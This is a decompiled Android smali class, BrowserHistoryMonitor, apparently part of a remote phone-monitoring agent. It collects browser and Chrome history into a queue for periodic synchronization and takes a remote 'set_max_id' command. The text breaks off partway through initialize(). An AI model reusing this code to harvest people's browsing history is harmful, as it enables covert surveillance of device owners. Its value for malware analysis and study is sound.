.class public Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "BrowserHistoryMonitor.java"


# static fields
.field public static final ATTRIBUTE_MAX_HISTORY_DATE_CHROME_ROOT:Ljava/lang/String; = "max_history_date_chrome_root"

.field public static final ATTRIBUTE_MAX_HISTORY_ID:Ljava/lang/String; = "max_history_id"

.field public static final ATTRIBUTE_MAX_READ_PER_ITERATION_CHROME_ROOT:Ljava/lang/String; = "500"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field public static final COMMAND_SET_MAX_ID:Ljava/lang/String; = "set_max_id"

.field public static final PARAMETER_NEW_MAX_ID:Ljava/lang/String; = "new_max_id"

.field protected static final TAG:Ljava/lang/String; = "BrowserHistoryMonitor"


# instance fields
.field protected browserHistoryObservers:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;",
            ">;"
        }
    .end annotation
.end field

.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;"
        }
    .end annotation
.end field

.field protected lastSynchronization:Ljava/lang/Long;

.field protected listerThread:Ljava/lang/Thread;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 65
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    .line 78
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->browserHistoryObservers:Ljava/util/ArrayList;

    const/4 v0, 0x0

    .line 80
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 81
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 82
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 83
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    .line 84
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    const/4 v1, 0x0

    .line 86
    iput-boolean v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->monitoringStatus:Z

    .line 88
    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public buildChromeInputKey()Ljava/lang/String;
    .locals 1

    const-string v0, "max_history_id_2"

    return-object v0
.end method

.method public buildDefaultInputKey()Ljava/lang/String;
    .locals 1

    const-string v0, "max_history_id_1"

    return-object v0
.end method

.method public dispatch(Ljava/lang/String;Ljava/util/Map;Ljava/lang/String;)Z
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/util/Map<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;",
            "Ljava/lang/String;",
            ")Z"
        }
    .end annotation

    move-object v8, p0

    move-object v1, p2

    .line 430
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    .line 432
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->isActivated()Z

    move-result v3

    const/4 v4, 0x0

    if-nez v3, :cond_0

    const-string v1, "BrowserHistoryMonitor"

    const-string v3, "dispatch(): This module is currently DEactivated."

    .line 433
    invoke-interface {v2, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v4

    .line 445
    :cond_0
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getModules()Ljava/util/List;

    move-result-object v3

    .line 447
    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    const/4 v6, 0x0

    if-eqz v5, :cond_2

    .line 448
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Lcom/hp/vd/module/IModule;

    .line 449
    invoke-interface {v5}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v7

    const-string v9, "type"

    invoke-virtual {v7, v9}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_1

    const-string v9, "command-response-dispatcher"

    .line 451
    invoke-virtual {v7, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    goto :goto_0

    :cond_2
    move-object v5, v6

    :goto_0
    const/4 v3, 0x1

    const/4 v7, 0x3

    const/4 v9, 0x2

    if-eqz v5, :cond_3

    const/4 v10, 0x6

    .line 460
    :try_start_0
    new-array v10, v10, [Ljava/lang/Class;

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v4

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v3

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v9

    const-class v11, Ljava/lang/String;

    aput-object v11, v10, v7

    const/4 v11, 0x4

    const-class v12, Ljava/util/Date;

    aput-object v12, v10, v11

    const/4 v11, 0x5

    const-class v12, Ljava/util/Date;

    aput-object v12, v10, v11

    .line 469
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v11

    const-string v12, "dispatchResponse"

    .line 470
    invoke-virtual {v11, v12, v10}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v10
    :try_end_0
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    move-object v10, v0

    const-string v11, "BrowserHistoryMonitor"

    const-string v12, "dispatch(): NoSuchMethodException caught when getting dispatchResponse()."

    .line 473
    invoke-interface {v2, v11, v12, v10}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_3
    move-object v10, v6

    :goto_1
    const-string v6, "set_max_id"

    move-object v11, p1

    .line 481
    invoke-virtual {v11, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_6

    const-string v3, "BrowserHistoryMonitor"

    const-string v6, "dispatch(): dispatching set_max_id"

    .line 482
    invoke-interface {v2, v3, v6, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const-string v3, "new_max_id"

    .line 484
    invoke-interface {v1, v3}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_4

    const-string v1, "BrowserHistoryMonitor"

    const-string v3, "dispatch(): dispatching set_max_id: parameter not set: new_max_id"

    .line 485
    invoke-interface {v2, v1, v3, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 491
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 497
    invoke-virtual {v8}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    .line 499
    invoke-virtual {v9}, Ljava/lang/Boolean;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v1, v8

    move-object v2, v5

    move-object v3, v10

    move-object/from16 v4, p3

    move-object v5, v6

    move-object v6, v11

    .line 493
    invoke-virtual/range {v1 .. v7}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->returnResponse(Lcom/hp/vd/module/IModule;Ljava/lang/reflect/Method;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    .line 502
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    return v1

    .line 505
    :cond_4
    iget-object v3, v8, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 506
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object v4

    const-string v6, "new_max_id"

    .line 507
    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 505
    invoke-virtual {v3, v4, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 510
    iget-object v3, v8, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 511
    invoke-virtual {v8}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object v4

    const-string v6, "new_max_id"

    .line 512
    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    .line 510
    invoke-virtual {v3, v4, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "BrowserHistoryMonitor"

    .line 515
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "dispatch(): max_history_id_[0-1] is now: "

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "new_max_id"

    .line 517
    invoke-interface {v1, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 515
    invoke-interface {v2, v3, v1, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 521
    iget-object v1, v8, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v8, v1}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 523
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_5

    const-string v1, "BrowserHistoryMonitor"

    const-string v3, "dispatch(): there was an error persisting the newly configured max_call_id."

    .line 524
    invoke-interface {v2, v1, v3, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 535
    :cond_5
    invoke-virtual {v8}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    .line 537
    invoke-virtual {v9}, Ljava/lang/Boolean;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v1, v8

    move-object v2, v5

    move-object v3, v10

    move-object/from16 v4, p3

    move-object v5, v6

    move-object v6, v11

    .line 531
    invoke-virtual/range {v1 .. v7}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->returnResponse(Lcom/hp/vd/module/IModule;Ljava/lang/reflect/Method;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z

    .line 540
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    return v1

    :cond_6
    return v3
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 95
    const-class v0, Lcom/hp/vd/data/BrowserHistoryData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 4

    .line 100
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 102
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 103
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 104
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 105
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x6

    .line 106
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v2, "v6.0"

    .line 107
    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v2, "data"

    const-string v3, "text"

    .line 109
    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 110
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object v2

    const-string v3, "0"

    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 111
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object v2

    const-string v3, "0"

    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "max_history_date_chrome_root"

    const-string v3, "0"

    .line 112
    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "synchronization_interval"

    const-string v3, "3540"

    .line 113
    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 115
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 116
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 118
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "BrowserHistoryMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired(Ljava/lang/Long;I)Z
    .locals 8

    .line 775
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const/4 v1, 0x1

    if-nez p1, :cond_0

    return v1

    .line 781
    :cond_0
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    sub-long v6, v2, v4

    int-to-long p1, p2

    cmp-long v0, v6, p1

    if-lez v0, :cond_1

    return v1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method public initialize()Z
    .locals 13

    .line 246
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 252
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    const/4 v8, 0x0

    .line 259
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "history_max_history_id_1"

    const-string v2, "history_max_history_id_2"

    .line 268
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object v3

    .line 269
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object v4

    .line 272
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    const-string v6, "system"

    .line 274
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v7

    invoke-virtual {v7}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 272
    invoke-virtual {v5, v6, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 277
    invoke-interface {v5, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-nez v6, :cond_0

    invoke-interface {v5, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_6

    .line 278
    :cond_0
    invoke-interface {v5, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_1

    const-string v6, "0"

    .line 279
    invoke-interface {v5, v1, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 280
    iget-object v7, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v7, v3, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v7, "BrowserHistoryMonitor"

    .line 282
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Loaded (after update) "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ": "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v7, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 285
    :cond_1
    invoke-interface {v5, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_2

    const-string v6, "0"

    .line 286
    invoke-interface {v5, v2, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 287
    iget-object v7, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v7, v4, v6}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v7, "BrowserHistoryMonitor"

    .line 289
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Loaded (after update) "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, ": "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v7, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 292
    :cond_2
    iget-object v6, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v6

    if-nez v6, :cond_3

    const-string v1, "BrowserHistoryMonitor"

    const-string v2, "Could not persist merged moduleData with preferences from the old version of this module"

    const/4 v5, 0x3

    .line 293
    invoke-interface {v0, v1, v2, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 307
    :cond_3
    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 309
    invoke-interface {v5, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 310
    invoke-interface {v6, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 313
    :cond_4
    invoke-interface {v5, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_5

    .line 314
    invoke-interface {v6, v2}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 317
    :cond_5
    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_6
    :goto_0
    const-string v1, "BrowserHistoryMonitor"

    .line 322
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "initialize(): "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " set to "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 324
    invoke-virtual {v5, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    .line 322
    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const-string v1, "BrowserHistoryMonitor"

    .line 328
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "initialize(): "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " set to "

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 330
    invoke-virtual {v5, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 328
    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    const-string v2, "BrowserHistoryMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 335
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 343
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 350
    :goto_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    const/4 v9, 0x1

    if-gt v1, v2, :cond_7

    .line 351
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "BrowserHistoryMonitor"

    const-string v3, "initialize(): running on <= LOLLIPOP. About to register observers (deactivate()d for now)"

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 366
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    .line 368
    new-instance v11, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;

    const/4 v2, 0x1

    sget-object v3, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

